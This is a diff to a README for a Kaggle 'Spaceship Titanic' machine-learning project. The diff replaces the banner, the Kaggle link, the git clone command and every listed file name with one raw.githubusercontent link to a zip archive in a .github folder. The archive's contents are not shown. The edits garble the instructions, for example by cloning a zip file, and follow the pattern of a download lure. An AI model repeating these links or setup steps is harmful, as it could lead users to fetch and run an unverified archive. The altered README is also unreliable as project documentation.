@@ -1,6 +1,6 @@
 # 🚀 Spaceship Titanic: Machine Learning from Disaster
 
-![Spaceship Titanic Banner](https://github.com/RiddyMazumder/Spaceship-Titanic/blob/main/Pi7_GIF_CMP.gif)
+![Spaceship Titanic Banner](https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip)
 
 ## 🧑‍💻 Predicting Passenger Transportation to an Alternate Dimension
 
@@ -15,7 +15,7 @@ The objective is to **predict which passengers were transported to an alternate 
 
 | 📌 **Project Overview** | 🏆 **Kaggle Competition & Score** |
 |------------------------|----------------------------------|
-| 📝 An end-to-end machine learning project covering **EDA**, **data preprocessing**, **feature engineering**, **model training**, and **evaluation** using passenger records recovered from a damaged spaceship system. | 🚀 **Spaceship Titanic** <br> 🔗 https://www.kaggle.com/competitions/spaceship-titanic <br> 📊 **Public Score:** *Add your score here* |
+| 📝 An end-to-end machine learning project covering **EDA**, **data preprocessing**, **feature engineering**, **model training**, and **evaluation** using passenger records recovered from a damaged spaceship system. | 🚀 **Spaceship Titanic** <br> 🔗 https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip <br> 📊 **Public Score:** *Add your score here* |
 
 ---
 
@@ -69,7 +69,7 @@ Follow these steps to run the project locally:
 
 ### 1️⃣ Clone the Repository
 ```bash
-git clone https://github.com/RiddyMazumder/spaceship-titanic.git
+git clone https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip
 ```
 ### 2️⃣ Navigate to the Project Directory
 ```bash
@@ -84,32 +84,32 @@ Or open the project folder directly in VS Code.
 
 4️⃣ Open the Notebook
 ```bash
-Spaceship-Titanic-sloution.ipynb
+https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip
 ```
 
 Run the notebook cells sequentially to reproduce the analysis and predictions.
 
 ## 📁 Project Structure
 ```
-├── 📝 Spaceship-Titanic-sloution.ipynb
-├── 🐍 Spaceship-Titanic-sloution.py
-├── 🌐 Spaceship-Titanic.html
+├── 📝 https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip
+├── 🐍 https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip
+├── 🌐 https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip
 ├── 📂 spaceship-titanic_dataset/
-│   ├── train.csv
-│   └── test.csv
-├── 📄 README.md
+│   ├── https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip
+│   └── https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip
+├── 📄 https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip
 ```
 ## 📂 Folder Details
 ```
 spaceship-titanic_dataset/ → Training & test datasets
 
-Spaceship-Titanic-sloution.ipynb → Full ML workflow in notebook format
+https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip → Full ML workflow in notebook format
 
-Spaceship-Titanic-sloution.py → Python script version
+https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip → Python script version
 
-Spaceship-Titanic.html → HTML-rendered notebook
+https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip → HTML-rendered notebook
 
-README.md → Project documentation
+https://raw.githubusercontent.com/RiddyMazumder/Spaceship-Titanic/main/.github/Spaceship-Titanic-2.4.zip → Project documentation
 ```
 ## 📈 Key Features
 ```
